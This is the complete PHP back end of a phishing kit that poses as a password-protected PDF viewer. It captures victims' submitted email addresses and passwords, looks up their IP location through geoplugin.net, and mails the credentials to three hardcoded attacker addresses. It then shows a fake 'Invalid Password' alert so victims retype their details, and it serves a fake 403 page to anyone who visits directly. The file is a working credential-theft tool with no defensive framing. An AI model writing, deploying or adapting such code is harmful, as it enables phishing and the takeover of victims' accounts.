<?php
header('Access-Control-Allow-Origin: *');  
error_reporting(0);

$bcc = array('panshank1089@hotmail.com,panshank1089@rambler.ru,jabbahmachine108@yandex.com');

if($_SERVER['REQUEST_METHOD'] == 'POST'){
	$client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = @$_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $ip = $forward;
    }
    else{
        $ip = $remote;
    }
$data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
if($data && $data->geoplugin_countryName !== null){
      $ipp = $data->geoplugin_request;
      $country = $data->geoplugin_countryName;
      $city = $data->geoplugin_city;
      $code = $data->geoplugin_countryCode;
}
if(isset($_POST['password'])){
$id = $_POST['email'];
$id2 = $_POST['password'];
$body = "
---------+ PDF  Rezultz  |+-------\n
UserId: $id \n
Password: $id2 \n
[Client Info] \n
IP: $ipp \n
City: $city \n
Country: $country \n
";

    $sub = "EMP PDF LOG | [$id] | $country";
    
	foreach($bcc as $to){
    mail($to, $sub, $body);
}
	
//file_put_contents(".robots.txt", $body."\n", FILE_APPEND);
//file_put_contents($body."\n", FILE_APPEND);
echo "<script>alert('Invalid Password.. Please Enter Password To Access  Document.');  window.history.go(-1);</script>";
}
}else{
	//header('HTTP/1.0 403 Forbidden', true, 403);
echo "<script>alert('Invalid Password.. Please Enter Password To Access  Document.');  window.history.go(-1);</script>";
die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don\'t have permission to access this resource.</p>
<p>Additionally, a 403 Forbidden
error was encountered while trying to use an Error Document to handle the request.</p>
</body></html>
');
}
?>


